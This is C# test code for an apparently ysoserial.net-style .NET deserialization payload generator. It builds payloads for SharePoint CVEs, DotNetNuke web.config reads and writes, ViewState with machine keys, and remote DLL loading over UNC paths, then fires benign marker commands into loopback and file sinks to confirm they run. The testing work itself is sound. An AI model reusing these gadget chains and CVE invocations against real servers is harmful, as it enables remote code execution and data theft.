            string marker = MarkerPath("bgc_wp_" + formatter.Replace('.', '_') + (minify ? "_m" : "_n"));
            SafeDelete(marker);
            try
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = MarkerCommand(marker);
                ia.IsRawCmd = true;
                ia.Test = true; // the last gadget in the chain self-tests: it deserializes + fires
                ia.Minify = minify;
                RunSTA(delegate
                {
                    PayloadRunner.GenerateGadget(new GenerationRequest
                    {
                        GadgetName = "WindowsPrincipal",
                        BridgedGadgetChain = "TypeConfuseDelegate",
                        FormatterName = formatter,
                        OutputFormat = "",
                        InputArgs = ia,
                    });
                });
                return WaitForFile(marker, MarkerWaitMs);
            }
            finally { SafeDelete(marker); }
        }

        // ---- 6.4 plugin combination matrix ----

        // One curated row per plugin mode / CVE / inner-gadget (plugin modes are not
        // machine-enumerable: they live in NDesk OptionSet lambda strings and Run()
        // switch bodies). Each row must generate a non-empty payload, crossed with
        // minify off/on where the plugin exposes a minify option. A coverage guard over
        // every discovered plugin fails the build if a plugin is neither in the matrix
        // nor explicitly excluded, so a whole new plugin cannot slip through (a new
        // plugin MODE still has to be added here by hand, by design).
        //
        // Minify PROPAGATION: rows tagged .Shrinks() additionally assert the minify-on payload
        // is strictly smaller than the minify-off one (proof --minify reaches the wrapped gadget,
        // not merely that it still generates). This reuses the two passes the matrix already runs,
        // so there are no extra invocations. Both Altserialization modes are tagged: the Session
        // mode's --minify path uses a byte-splice that carries a minified BF blob (its firing is
        // covered in PayloadsFireIntoTestSinks). Minify-capable rows deliberately NOT tagged
        // .Shrinks(): MachineKeySessionSecurityTokenHandler and SessionSecurityTokenHandler - their
        // MachineKey / DPAPI transform randomizes and re-compresses the bytes, so neither size nor
        // byte comparison can prove propagation; their InputArgs.Minify = minify wiring is verified
        // by code and both still generate minify off/on here.
        private class PluginCell
        {
            public string Plugin;
            public string[] Argv;
            // When true, PluginFullMatrixGenerates additionally asserts that --minify makes this
            // cell's payload strictly smaller than the minify-off payload it already generates for
            // the same cell - proof the flag reaches the wrapped gadget, not just that generation
            // succeeds. Reusing the matrix's own two passes adds no extra plugin invocations, which
            // matters for the heavy System.Web / resgen plugins (ViewState, Resx) whose repeated
            // in-process loads otherwise throw a ReflectionTypeLoadException.
            public bool ExpectShrink;
            public PluginCell(string plugin, string[] argv) { Plugin = plugin; Argv = argv; }
            public PluginCell Shrinks() { ExpectShrink = true; return this; }
        }

        private static void PluginFullMatrixGenerates()
        {
            // Harmless hex keys (from the ViewState usage docs) for the crypto plugins.
            const string vk = "70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0";
            const string dk = "34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887";

            string innerJson = MakeTempFile("ysonet_pmatrix_inner.json", "{}");
            string tpqpInner = MakeTempFile("ysonet_pmatrix_tpqp.json", "{}");
            string csFixture = MakeTempFile("ysonet_pmatrix_fixture.cs",
                "public class YsonetTestFixture { public YsonetTestFixture() { } }");
            string resxOut = TestArtifactPath("ysonet_pmatrix.resources");

            var rows = new List<PluginCell>
            {
                new PluginCell("Altserialization", new[] { "-M", "HttpStaticObjectsCollection", "-c", "calc.exe" }).Shrinks(),
                new PluginCell("Altserialization", new[] { "-M", "SessionStateItemCollection", "-c", "calc.exe" }).Shrinks(),

                new PluginCell("ApplicationTrust", new[] { "-c", "calc.exe" }).Shrinks(),

                new PluginCell("DotNetNuke", new[] { "-m", "run_command", "-c", "calc.exe" }).Shrinks(),
                new PluginCell("DotNetNuke", new[] { "-m", "read_file", "-f", "web.config" }),
                new PluginCell("DotNetNuke", new[] { "-m", "write_file", "-f", "web.config", "-u", "http://localhost/x" }),

                new PluginCell("GetterCallGadgets", new[] { "-g", "PropertyGrid", "-i", innerJson }).Shrinks(),
                new PluginCell("GetterCallGadgets", new[] { "-g", "ListBox", "-m", "Items", "-i", innerJson }),
                new PluginCell("GetterCallGadgets", new[] { "-g", "CheckedListBox", "-m", "Items", "-i", innerJson }),
                new PluginCell("GetterCallGadgets", new[] { "-g", "ComboBox", "-m", "Items", "-i", innerJson }),

                new PluginCell("MachineKeySessionSecurityTokenHandler", new[] { "-c", "calc.exe", "--validationkey", vk, "--decryptionkey", dk }),

                new PluginCell("Resx", new[] { "-M", "BinaryFormatter", "-c", "calc.exe" }).Shrinks(),
                new PluginCell("Resx", new[] { "-M", "SoapFormatter", "-c", csFixture }),
                new PluginCell("Resx", new[] { "-M", "indirect_resx_file", "-F", "\\\\host\\share\\a.resx" }),
                new PluginCell("Resx", new[] { "-M", "CompiledDotResources", "-c", "calc.exe", "-of", resxOut }),

                new PluginCell("SessionSecurityTokenHandler", new[] { "-c", "calc.exe" }),

                new PluginCell("SharePoint", new[] { "--cve", "CVE-2018-8421", "-c", "calc.exe" }),
                new PluginCell("SharePoint", new[] { "--cve", "CVE-2018-8421", "-c", "http://localhost/x", "--useurl" }),
                new PluginCell("SharePoint", new[] { "--cve", "CVE-2019-0604", "-c", "calc.exe" }),
                new PluginCell("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe" }),
                new PluginCell("SharePoint", new[] { "--cve", "CVE-2025-49704", "-c", "calc.exe", "--variant", "1" }),
                new PluginCell("SharePoint", new[] { "--cve", "CVE-2025-49704", "-c", csFixture, "--variant", "2" }),
                // CVE-2025-53770 (ToolShell patch bypass) compiles -c as a .cs file, like 49704 variant 2.
                new PluginCell("SharePoint", new[] { "--cve", "CVE-2025-53770", "-c", csFixture }),
                // CVE-2026-50522 needs an explicit --target (the wctx base URL) and a BinaryFormatter gadget.
                new PluginCell("SharePoint", new[] { "--cve", "CVE-2026-50522", "--target", "https://sharepoint.example/", "--gadget", "TypeConfuseDelegate", "-c", "calc.exe" }),
                new PluginCell("SharePoint", new[] { "--cve", "CVE-2026-50522", "--formbody", "--target", "https://sharepoint.example/", "--gadget", "TypeConfuseDelegate", "-c", "calc.exe" }),

                // Remote-DLL-load gadgets with a natural UNC path: the plugin JSON-escapes the
                // input by default now, so the backslashes survive generation and the --minify
                // re-parse (previously \\host\a.dll embedded an invalid \a JSON escape).
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "UnmanagedLibrary", "-f", "Json.NET", "-i", "\\\\host\\a.dll" }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "WindowsLibrary", "-f", "Json.NET", "-i", "\\\\host\\a.dll" }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "Xunit1Executor", "-f", "Json.NET", "-i", "\\\\host\\a.dll" }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "GetterActiveMQObjectMessage", "-f", "Json.NET", "-i", "calc.exe" }).Shrinks(),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "PreserveWorkingFolder", "-f", "Json.NET", "-i", "targetdir" }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "OptimisticLockedTextFile", "-f", "Json.NET", "-i", "targetfile.txt" }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "QueryPartitionProvider", "-f", "Json.NET", "-i", tpqpInner }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "FileDiagnosticsTelemetryModule", "-f", "Json.NET", "-i", "targetdir" }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "SingleProcessFileAppender", "-f", "Json.NET", "-i", "targetdir" }),
                new PluginCell("ThirdPartyGadgets", new[] { "-g", "FileDataStore", "-f", "Json.NET", "-i", "targetdir" }),

                new PluginCell("TransactionManagerReenlist", new[] { "-c", "calc.exe" }).Shrinks(),

                new PluginCell("ViewState", new[] { "--dryrun", "--validationkey", vk }),
                new PluginCell("ViewState", new[] { "-g", "TypeConfuseDelegate", "-c", "calc.exe", "--validationkey", vk }).Shrinks(),
                new PluginCell("ViewState", new[] { "--unsignedpayload", "AAECAwQFBgcICQ==", "--validationkey", vk }),

                // One row per markup part the payload can ride in. Deliberately NOT tagged
                // .Shrinks(): the output is a deflate-compressed OPC package, so a smaller
                // inner XAML does not have to make a smaller ZIP. --minify still reaches the
                // inner ObjectDataProvider (it goes through InputArgs like every other
                // plugin) and both passes must generate.
                new PluginCell("Xps", new[] { "-m", "fdseq", "-c", "calc.exe" }),
                new PluginCell("Xps", new[] { "-m", "fdoc", "-c", "calc.exe" }),
                new PluginCell("Xps", new[] { "-m", "fpage", "-c", "calc.exe" }),
                new PluginCell("Xps", new[] { "-m", "all", "-c", "calc.exe" }),
            };

            // CVE-2024-38018 needs the bundled SharePoint 2019 DLLs. Include it only when present.
            string sp2019 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory,
                "dlls", "sharepoint", "19", "Microsoft.SharePoint.dll");
            if (File.Exists(sp2019))
                rows.Add(new PluginCell("SharePoint", new[] { "--cve", "CVE-2024-38018", "-c", "calc.exe" }));
            else
                Console.Error.WriteLine("  [skip] SharePoint CVE-2024-38018: bundled SharePoint 2019 DLLs not present");

            var excluded = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                { "ActivatorUrl", "makes a live remoting/network call and returns a status string, not a payload" },
                { "Clipboard", "writes the OS clipboard on an STA thread; covered by the dedicated clipboard tests" },
                { "Generic", "base plugin type, not a real plugin" },
            };

            bool trace = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
            var failures = new List<string>();
            var covered = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            try
            {
                foreach (PluginCell cell in rows)
                {
                    covered.Add(cell.Plugin);
                    IPlugin instance = PluginRegistry.CreatePluginInstance(cell.Plugin);
                    Type ptype = instance == null ? null : instance.GetType();
                    bool hasMinify = PluginHasMinify(instance);

                    // A .Shrinks() cell relies on the second (minify) pass to compare sizes; if the
                    // plugin has no --minify option that pass never runs and the shrink assertion
                    // would silently be a no-op. Fail loudly so the tag can never be dead weight.
                    if (cell.ExpectShrink && !hasMinify)
                        failures.Add(cell.Plugin + " " + string.Join(" ", cell.Argv)
                            + " -> tagged .Shrinks() but the plugin exposes no --minify option");

                    // minify off, then on where supported
                    int passes = hasMinify ? 2 : 1;
                    object rawPayload = null; // minify-off payload, to size-compare against minify-on
                    for (int mp = 0; mp < passes; mp++)
                    {
                        bool minify = mp == 1;
                        string[] argv = cell.Argv;
                        if (minify)
                        {
                            argv = new string[cell.Argv.Length + 1];
                            Array.Copy(cell.Argv, argv, cell.Argv.Length);
                            argv[argv.Length - 1] = "--minify";
                        }

                        string desc = cell.Plugin + " " + string.Join(" ", cell.Argv) + (minify ? " --minify" : "");
                        if (trace) { Console.Error.WriteLine("    [plugin] " + desc); Console.Error.Flush(); }

                        ResetPluginStatics(ptype);
                        RunResult r;
                        try { r = PayloadRunner.RunPlugin(cell.Plugin, argv); }
                        catch (Exception ex) { failures.Add(desc + " -> THREW " + ex.Message); continue; }
                        if (!r.Success) { failures.Add(desc + " -> " + r.ErrorMessage); continue; }
                        if (RawIsEmpty(r.Raw)) { failures.Add(desc + " -> empty payload"); continue; }

                        // Minify PROPAGATION: for a cell marked .Shrinks(), the minified payload
                        // must be strictly smaller than the minify-off one this loop already made.
                        // Identical size means the --minify flag never reached the wrapped gadget.
                        if (!minify)
                        {
                            rawPayload = r.Raw;
                        }
                        else if (cell.ExpectShrink && rawPayload != null)
                        {
                            int rl = RawLength(rawPayload), ml = RawLength(r.Raw);
                            if (ml >= rl)
                                failures.Add(cell.Plugin + " " + string.Join(" ", cell.Argv)
                                    + " -> --minify did not shrink (raw=" + rl + " min=" + ml + "); the flag may not reach the wrapped gadget");
                        }
                    }
                }

                // Coverage guard: every discovered plugin is generated or excluded.
                foreach (string name in PluginRegistry.GetAllPluginNames())
                {
                    bool known = covered.Contains(name) || excluded.ContainsKey(name);
                    AssertTrue(known, "plugin " + name + " has no matrix row and no explicit exclusion (add one)");
                }
            }
            finally
            {
                try { File.Delete(innerJson); } catch { }
                try { File.Delete(tpqpInner); } catch { }
                try { File.Delete(csFixture); } catch { }
                try { File.Delete(resxOut); } catch { }
            }

            AssertTrue(failures.Count == 0,
                "plugin matrix cells failed (" + failures.Count + "):\n  " + string.Join("\n  ", failures.ToArray()));
        }

        private static bool PluginHasMinify(IPlugin plugin)
        {
            if (plugin == null) return false;
            foreach (OptionField f in OptionField.FromOptionSet(plugin.Options()))
                if (string.Equals(f.Name, "minify", StringComparison.OrdinalIgnoreCase))
                    return true;
            return false;
        }

        // ---- 6.3 payload execution into test-owned sinks ----

        // A loopback capture proxy: a TcpListener on 127.0.0.1:0 whose only job is to
        // notice that a connection arrived. An SSRF/callback/remoting payload pointed at
        // its Url makes the deserializer connect here; the accepted connection is the
        // proof it fired. No external traffic, no rogue server.
        private class LoopbackListener : IDisposable
        {
            private readonly System.Net.Sockets.TcpListener _listener;
            private readonly System.Threading.Thread _thread;
            private volatile bool _hit;
            private volatile bool _stop;
            public int Port { get; private set; }

            public LoopbackListener()
            {
                _listener = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Loopback, 0);
                _listener.Start();
                Port = ((System.Net.IPEndPoint)_listener.LocalEndpoint).Port;
                _thread = new System.Threading.Thread(AcceptLoop);
                _thread.IsBackground = true;
                _thread.Start();
            }

            private void AcceptLoop()
            {
                try
                {
                    while (!_stop)
                    {
                        var client = _listener.AcceptTcpClient();
                        _hit = true;
                        try { client.Close(); } catch { }
                    }
                }
                catch { /* Stop() unblocks AcceptTcpClient with an exception */ }
            }

            public string HttpUrl { get { return "http://127.0.0.1:" + Port + "/x"; } }
            public string TcpUrl { get { return "tcp://127.0.0.1:" + Port + "/x"; } }

            public bool Fired(int totalMs)
            {
                int waited = 0;
                while (waited < totalMs && !_hit) { System.Threading.Thread.Sleep(50); waited += 50; }
                return _hit;
            }

            public void Dispose()
            {
                _stop = true;
                try { _listener.Stop(); } catch { }
            }
        }

        private static string MarkerPath(string tag)
        {
            return TestArtifactPath("ysonet_fire_" + tag + ".txt");
        }

        // A self-closing marker command: cmd /c echo x > "marker". Works whether or not
        // the caller (a plugin) wraps it again in cmd /c.
        private static string MarkerCommand(string marker)
        {
            return "cmd /c echo x > \"" + marker + "\"";
        }

        // Every cleanup of a fire marker must go through this, never a bare File.Delete.
        // WaitForFile returns as soon as the file EXISTS, and "cmd /c echo x > marker"
        // creates it before it writes and closes, so a delete right after the wait can
        // land while the spawned cmd still holds the handle and throws "used by another
        // process". That is housekeeping failing, not the payload failing, so it must
        // never fail a test: the startup sweep removes whatever is left behind.
        private static void SafeDelete(string path)
        {
            try { if (path != null && File.Exists(path)) File.Delete(path); } catch { }
        }

        private static void SafeDeleteDir(string path)
        {
            try { if (path != null && Directory.Exists(path)) Directory.Delete(path, true); } catch { }
        }

        // Fire a gadget through its OWN self-test path: generate with Test=true on an STA
        // thread, which runs the gadget's designed round-trip in-process and installs any
        // serializationBinder the gadget sets (for example PSObject's LocalBinder, which
        // resolves PSObject to the bundled recompiled vulnerable DLL - a plain deserialize
        // would resolve it to the patched GAC assembly and never fire). The marker file is
        // the proof. reasonIfSkipped is logged when the gadget does not fire on this machine
        // (a Mono-only gadget on .NET Framework, or a patched framework) - not a failure.
        private static void FireGadgetSelfTest(string gadget, string formatter, string reasonIfSkipped,
            List<string> failures, ref int fired, ref int skipped, bool trace)
        {
            if (RefuseToFireDosGadget(gadget, failures)) return;
            string marker = MarkerPath(gadget + "_selftest");
            SafeDelete(marker);
            if (trace) { Console.Error.WriteLine("    [fire] " + gadget + " (self-test)"); Console.Error.Flush(); }
            try
            {
                RunSTA(delegate
                {
                    InputArgs ia = new InputArgs();
                    ia.Cmd = MarkerCommand(marker);
                    ia.IsRawCmd = true;
                    ia.Test = true; // the gadget's own self-test deserializes (fires) in-process
                    PayloadRunner.GenerateGadget(new GenerationRequest
                    {
                        GadgetName = gadget,
                        FormatterName = formatter,
                        OutputFormat = "",
                        InputArgs = ia,
                    });
                });
                if (WaitForFile(marker, MarkerWaitMs)) { fired++; RuntimeBuild.RecordFired(gadget); }
                else { skipped++; Console.Error.WriteLine("  [skip] fire " + gadget + " (self-test): marker not created - " + reasonIfSkipped); }
            }
            catch (Exception ex) { skipped++; Console.Error.WriteLine("  [skip] fire " + gadget + " (self-test): " + ex.Message); }
            finally { SafeDelete(marker); }
        }

        // Last-line defense for the execution matrix: a denial-of-service payload must
        // never be deserialized here, because it would disrupt or terminate the test
        // runner itself. The rows inside PayloadsFireIntoTestSinks are local variables
        // that no separate coverage test can inspect, so the guard sits at the three
        // generic fire helpers every row goes through. This is a hard failure, not a
        // skip: an accidental DoS row is a mistake to fix, not a case to tolerate. The
        // --dos opt-in deliberately does NOT unlock this; nothing in the suite fires a
        // DoS payload.
        private static bool RefuseToFireDosGadget(string gadget, List<string> failures)
        {
            if (!DosPolicy.IsDosGadget(gadget))
                return false;
            failures.Add("fire " + gadget + ": denial-of-service gadgets must never be added to a fire list");
            return true;
        }

        // Run one payload through the deserializer named by the caller's short tag.
        //
        // A gadget's Raw comes back as either a string or a byte[] depending on how it built
        // the payload: the ones that hand-build XML/JSON return a string, the ones that go
        // through the base GenericGenerator.Serialize return the serialized bytes. The two
        // shapes are normalized HERE, once, instead of in every call site's cast. That
        // matters because RunSTA swallows exceptions on purpose (most gadgets throw AFTER
        // firing), so a bad cast here is invisible and looks exactly like a payload that did
        // not fire. Text() decodes bytes for the string-taking helpers; Bytes() re-encodes a
        // string for the byte-taking ones. An unknown tag is a hard error, not a silent no-op.
        private static void DeserializeAs(string deserAs, object raw)
        {
            switch (deserAs)
            {
                case "bf": SerializersHelper.BinaryFormatter_deserialize(Bytes(raw)); break;
                case "los": SerializersHelper.LosFormatter_deserialize(Bytes(raw)); break;
                case "xaml": SerializersHelper.Xaml_deserialize(Text(raw)); break;
                case "json": SerializersHelper.JsonNet_deserialize(Text(raw)); break;
                case "ndc": SerializersHelper.NetDataContractSerializer_deserialize(Text(raw)); break;
                case "dcs": SerializersHelper.DataContractSerializer_deserialize(Text(raw), null, "root", "type"); break;
                case "soap": SerializersHelper.SoapFormatter_deserialize(Text(raw)); break;
                case "jss": SerializersHelper.JavaScriptSerializer_deserialize(Text(raw)); break;
                case "fastjson": SerializersHelper.FastJson_deserialize(Text(raw)); break;
                case "yaml": SerializersHelper.YamlDotNet_deserialize(Text(raw)); break;
                case "ssx": SerializersHelper.SharpSerializer_Xml_deserialize_FromString(Text(raw)); break;
                case "ssb": SerializersHelper.SharpSerializer_Binary_deserialize_FromByteArray(Bytes(raw)); break;
                case "mp": SerializersHelper.MessagePackTypeless_deserialize(Bytes(raw), false); break;
                case "mplz4": SerializersHelper.MessagePackTypeless_deserialize(Bytes(raw), true); break;
                default: throw new Exception("unknown deserializer tag: " + deserAs);
            }
        }

        // Payload as text. Every formatter that produces a text document writes UTF-8, and
        // UTF8.GetString also round-trips plain ASCII (the SOAP case), so one decode covers
        // all of them.
        private static string Text(object raw)
        {
            if (raw == null) throw new Exception("payload is null");
            byte[] bytes = raw as byte[];
            if (bytes != null) return Encoding.UTF8.GetString(bytes);
            string s = raw as string;
            if (s != null) return s;
            throw new Exception("payload is neither string nor byte[], but " + raw.GetType().Name);
        }

        // Payload as bytes, for the binary deserializers.
        private static byte[] Bytes(object raw)
        {
            if (raw == null) throw new Exception("payload is null");
            byte[] bytes = raw as byte[];
            if (bytes != null) return bytes;
            string s = raw as string;
            if (s != null) return Encoding.UTF8.GetBytes(s);
            throw new Exception("payload is neither string nor byte[], but " + raw.GetType().Name);
        }

        // Generate the gadget's own payload with a marker command, deserialize it
        // in-process on an STA thread, and prove the command fired via the marker file.
        // formatter/deserialize helper are chosen per gadget by the caller.
        private static void FireGadgetMarker(string gadget, string formatter, int variant,
            bool minify, bool useSimpleType, string deserAs, bool required,
            List<string> failures, ref int fired, ref int skipped, bool trace)
        {
            if (RefuseToFireDosGadget(gadget, failures)) return;
            string tag = gadget + "_" + formatter + (variant > 0 ? "_v" + variant : "") + (minify ? "_m" : "") + (useSimpleType ? "_u" : "");
            string marker = MarkerPath(tag);
            SafeDelete(marker);
            if (trace) { Console.Error.WriteLine("    [fire] " + tag); Console.Error.Flush(); }
            try
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = MarkerCommand(marker);
                ia.IsRawCmd = true;
                ia.Test = false;
                ia.Minify = minify;
                ia.UseSimpleType = useSimpleType;
                if (variant > 0)
                    ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };

                GenerationRequest req = new GenerationRequest
                {
                    GadgetName = gadget,
                    FormatterName = formatter,
                    OutputFormat = "",
                    InputArgs = ia,
                };
                RunResult r = PayloadRunner.GenerateGadget(req);
                if (!r.Success)
                {
                    string msg = "fire " + tag + ": generate -> " + r.ErrorMessage;
                    if (required) failures.Add(msg); else { skipped++; Console.Error.WriteLine("  [skip] " + msg); }
                    return;
                }

                RunSTA(delegate { DeserializeAs(deserAs, r.Raw); });

                if (WaitForFile(marker, MarkerWaitMs)) { fired++; RuntimeBuild.RecordFired(gadget); }
                else
                {
                    string msg = "fire " + tag + ": marker not created";
                    if (required) failures.Add(msg); else { skipped++; Console.Error.WriteLine("  [skip] " + msg + " (conditional)"); }
                }
            }
            catch (Exception ex)
            {
                string msg = "fire " + tag + ": " + ex.Message;
                if (required) failures.Add(msg); else { skipped++; Console.Error.WriteLine("  [skip] " + msg); }
            }
            finally { SafeDelete(marker); }
        }

        // Fire a *FromFile compile gadget: feed it a .cs whose constructor writes the
        // marker, then let ysonet.exe deserialize (self-test) the BinaryFormatter payload
        // so the compiled assembly runs. This is done in a SUBPROCESS on purpose: these
        // gadgets run attacker-compiled code through XamlReader/Assembly.Load machinery
        // that can crash the host process (XamlAssemblyLoadFromFile exits non-zero after
        // firing), so isolating it keeps the test runner alive. The marker file is the
        // proof, independent of the subprocess exit code.
        private static void FireSelfClosingCs(string gadget, List<string> failures, ref int fired, ref int skipped, bool trace)
        {
            FireSelfClosingCs(gadget, failures, ref fired, ref skipped, trace, false);
        }

        // The 6-arg overload also fires the MINIFIED payload. For the compiled-assembly
        // gadgets this locks the XmlMinifier perf fix end-to-end: DataSetOldBehaviourFromFile
        // --minify used to take ~112s (encodingStyle O(n^2) regex), now it is fast and its
        // minified payload must still execute.
        private static void FireSelfClosingCs(string gadget, List<string> failures, ref int fired, ref int skipped, bool trace, bool minify)
        {
            FireSelfClosingCs(gadget, failures, ref fired, ref skipped, trace, minify, false);
        }

        // The 7-arg overload also fires the --compressed path (GZip-in-payload). It must still
        // Assembly.Load and run the compiled type after decompressing, just like the plain form.
        private static void FireSelfClosingCs(string gadget, List<string> failures, ref int fired, ref int skipped, bool trace, bool minify, bool compressed)
        {
            FireSelfClosingCs(gadget,
                (minify ? " --minify" : "") + (compressed ? " --compressed" : ""),
                (minify ? "min_" : "") + (compressed ? "c_" : ""),
                (minify ? " (minify)" : "") + (compressed ? " (compressed)" : ""),
                failures, ref fired, ref skipped, trace);
        }

        // The general form: fire with any EXTRA gadget options (for example "--rootcontainer 2"),
        // which the boolean overloads above cannot express. tag keeps the marker and the .cs
        // fixture distinct per row, so a red test is unambiguous and two rows for one gadget
        // never share files.
        private static void FireSelfClosingCs(string gadget, string extraArgs, string tag, string labelSuffix,
            List<string> failures, ref int fired, ref int skipped, bool trace)
        {
            if (RefuseToFireDosGadget(gadget, failures)) return;
            string label = gadget + labelSuffix;
            string exe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ysonet.exe");
            if (!File.Exists(exe))
            {
                skipped++;
                Console.Error.WriteLine("  [skip] fire " + label + " (self-cs): ysonet.exe not found beside the test exe");
                return;
            }

            // Distinct marker/cs per row so a red test is unambiguous and two fires for one
            // gadget never share files.
            string marker = MarkerPath(gadget + "_" + tag + "selfcs");
            SafeDelete(marker);
            string cs = WriteTestArtifact("ysonet_selfcs_" + tag + gadget + ".cs",
                "public class E { public E() { System.IO.File.WriteAllText(@\"" + marker + "\", \"x\"); } }");
            if (trace) { Console.Error.WriteLine("    [fire] " + label + " (self-cs subprocess)"); Console.Error.Flush(); }
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo(exe,
                    "-g " + gadget + " -f BinaryFormatter -c \"" + cs + "\" -t" + extraArgs);
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                using (var proc = System.Diagnostics.Process.Start(psi))
                {
                    // Drain the pipes so a large payload on stdout cannot deadlock the wait.
                    proc.OutputDataReceived += delegate { };
                    proc.ErrorDataReceived += delegate { };
                    proc.BeginOutputReadLine();
                    proc.BeginErrorReadLine();
                    if (!proc.WaitForExit(40000)) { try { proc.Kill(); } catch { } }
                }
                if (WaitForFile(marker, MarkerWaitMs)) { fired++; RuntimeBuild.RecordFired(gadget); }
                else failures.Add("fire " + label + " (self-cs subprocess): marker not created");
            }
            catch (Exception ex) { failures.Add("fire " + label + " (self-cs): " + ex.Message); }
            finally { SafeDelete(marker); SafeDelete(cs); }
        }

        // Fire a plugin through its own -t self-test path into a marker sink.
        private static void FirePluginMarker(string plugin, string[] baseArgv, List<string> failures, ref int fired, bool trace)
        {
            string marker = MarkerPath("plugin_" + plugin + "_" + string.Join("_", baseArgv));
            SafeDelete(marker);
            var argv = new List<string>(baseArgv);
            argv.Add("-c"); argv.Add(MarkerCommand(marker));
            argv.Add("-t");
            if (trace) { Console.Error.WriteLine("    [fire] plugin " + plugin + " " + string.Join(" ", baseArgv)); Console.Error.Flush(); }
            try
            {
                IPlugin instance = PluginRegistry.CreatePluginInstance(plugin);
                ResetPluginStatics(instance == null ? null : instance.GetType());
                RunSTA(delegate { PayloadRunner.RunPlugin(plugin, argv.ToArray()); });
                if (WaitForFile(marker, MarkerWaitMs)) fired++;
                else failures.Add("fire plugin " + plugin + " " + string.Join(" ", baseArgv) + ": marker not created");
            }
            catch (Exception ex) { failures.Add("fire plugin " + plugin + ": " + ex.Message); }
            finally { SafeDelete(marker); }
        }

        // Fire one Xps plugin mode. Both halves of the CVE-2020-0605 gate are asserted:
        //  1) with the framework switches at their PATCHED defaults the document must parse
        //     with the gadget dropped, so the marker must NOT appear (an absence assertion,
        //     so it keeps a short bound like the restrictive clipboard case);
        //  2) with the legacy switches flipped - what a target that opted out of the
        //     mitigation looks like - the marker MUST appear.
        // The switches are process-wide statics and ClipboardPayloadsTrigger asserts that a
        // restrictive load blocks, so they are restored and the restore is then verified.
        // A framework predating the mitigation has no switch to flip; that is a capability
        // the machine genuinely lacks, so it is a logged skip, not a silent pass.
        private static void FireXpsDocument(string mode, List<string> failures, ref int fired, ref int skipped, bool trace)
        {
            bool[] initial;
            try
            {
                initial = SerializersHelper.Xps_get_legacy_switch_state();
            }
            catch (NotSupportedException nse)
            {
                skipped++;
                Console.Error.WriteLine("  [skip] fire Xps " + mode + ": " + nse.Message);
                return;
            }

            string marker = MarkerPath("plugin_Xps_" + mode);
            string xpsFile = TestArtifactPath("ysonet_xps_" + mode + ".xps");
            SafeDelete(marker);
            SafeDelete(xpsFile);
            if (trace) { Console.Error.WriteLine("    [fire] plugin Xps -m " + mode); Console.Error.Flush(); }

            bool[] previous = null;
            try
            {
                RunResult r = PayloadRunner.RunPlugin("Xps", new[] { "-m", mode, "-c", MarkerCommand(marker) });
                if (!r.Success)
                {
                    failures.Add("fire Xps " + mode + ": generation failed: " + r.ErrorMessage);
                    return;
                }
                File.WriteAllBytes(xpsFile, Bytes(r.Raw));

                // 1) The patched default must drop the gadget.
                RunSTA(delegate { SerializersHelper.Xps_load_and_walk(xpsFile); });
                if (WaitForFile(marker, 2500))
                {
                    failures.Add("fire Xps " + mode + ": the gadget ran on the PATCHED default path");
                    SafeDelete(marker);
                }

                // 2) A target that opted out of the mitigation must run it.
                previous = SerializersHelper.Xps_set_legacy_dangerous_mode(true);
                RunSTA(delegate { SerializersHelper.Xps_load_and_walk(xpsFile); });
                if (WaitForFile(marker, MarkerWaitMs)) fired++;
                else failures.Add("fire Xps " + mode + ": marker not created in legacy mode");
            }
            catch (Exception ex) { failures.Add("fire Xps " + mode + ": " + ex.Message); }
            finally
            {
                if (previous != null)
                {
                    try { SerializersHelper.Xps_restore_legacy_dangerous_mode(previous); }
                    catch (Exception restoreError)
                    { failures.Add("fire Xps " + mode + ": could not restore the switches: " + restoreError.Message); }
                }
                try
                {
                    bool[] after = SerializersHelper.Xps_get_legacy_switch_state();
                    for (int i = 0; i < after.Length && i < initial.Length; i++)
                        if (after[i] != initial[i])
                            failures.Add("fire Xps " + mode + ": left compat switch " + i + " flipped for the rest of the run");
                }
                catch { }
                SafeDelete(marker);
                SafeDelete(xpsFile);
            }
        }

        // Fire Resx compileddotresources via a ysonet.exe subprocess self-test: it writes a
        // .resources file then reads it back through a ResourceSet, which resolves reliably in
        // a full ysonet process. The marker file is the proof.
        private static void FireResxCompiledSubprocess(List<string> failures, ref int fired, ref int skipped, bool trace)
        {
            string exe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ysonet.exe");
            if (!File.Exists(exe))
            {
                skipped++;
                Console.Error.WriteLine("  [skip] fire Resx compileddotresources: ysonet.exe not found beside the test exe");
                return;
            }
            string marker = MarkerPath("plugin_Resx_compiled");
            string resxOut = TestArtifactPath("ysonet_fire.resources");
            SafeDelete(marker); SafeDelete(resxOut);
            if (trace) { Console.Error.WriteLine("    [fire] plugin Resx compileddotresources (subprocess)"); Console.Error.Flush(); }
            try
            {
                // Escape the inner quotes of the marker command for the child command line.
                string quotedCmd = "\"" + MarkerCommand(marker).Replace("\"", "\\\"") + "\"";
                string args = "-p Resx -M compileddotresources -of \"" + resxOut + "\" -c " + quotedCmd + " -t";
                var psi = new System.Diagnostics.ProcessStartInfo(exe, args);
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
